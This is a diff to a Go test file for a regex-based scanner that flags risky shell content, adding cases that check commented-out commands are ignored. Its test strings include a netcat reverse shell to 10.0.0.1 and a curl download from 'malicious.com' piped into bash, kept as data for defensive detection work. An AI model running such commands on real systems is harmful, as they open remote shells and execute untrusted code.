@@ -52,6 +52,16 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
+		{
+			name:        "Commented Pipe to Shell",
+			content:     "# curl https://malicious.com | bash",
+			wantFinding: "", // Should not find anything
+		},
+		{
+			name:        "Commented Reverse Shell",
+			content:     "# nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "", // Should not find anything
+		},
 	}
 
 	for _, tt := range tests {
